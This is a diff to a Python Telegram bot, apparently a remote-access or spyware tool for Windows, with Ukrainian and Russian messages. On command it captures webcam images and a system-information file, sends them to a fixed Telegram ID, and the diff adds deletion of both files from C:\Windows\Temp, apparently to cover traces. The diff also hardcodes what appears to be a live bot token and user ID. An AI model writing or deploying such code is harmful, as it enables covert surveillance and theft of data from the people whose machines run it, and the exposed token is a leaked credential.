@@ -6,8 +6,8 @@ import os
 import time
 import pyautogui
 
-bot = telebot.TeleBot("Token")
-ID: int =#you telegram id
+bot = telebot.TeleBot("5377433922:AAG4QIoFIbtv587e4QJ9a7bo1AKtB4zxK6I")
+ID: int = 886293441
 
 
 @bot.message_handler(commands=['start', 'help'])
@@ -43,12 +43,14 @@ def func(message):
             for i in range(30):
                 cap.read()
             ret, image = cap.read()
-            cv2.imwrite('cam.png', image)
+            path = 'C:\Windows\Temp'
+            cv2.imwrite(os.path.join(path , 'cam.jpg'), image)
             cap.release()
-            photo = open('cam.png', 'rb')
+            photo = open('C:\Windows\Temp\cam.jpg', 'rb')
             bot.send_message(ID, "Знімок з камери")
             bot.send_photo(ID, photo)
             photo.close()
+            os.remove("C:\Windows\Temp\cam.jpg")
 
 
 ###########################################################################
@@ -126,8 +128,10 @@ def func(message):
             bot.send_message(ID, text="Ща брат 5 сек".format(message.from_user))
             os.system("python pc_information.py")
             time.sleep(5)
-            doc = open("info.txt", "rb")
+            doc = open("C:\Windows\Temp/info.txt", "rb")
             bot.send_document(ID, doc)
+            doc.close()
+            os.remove("C:\Windows\Temp\info.txt")
 
 ###########################################################################
 
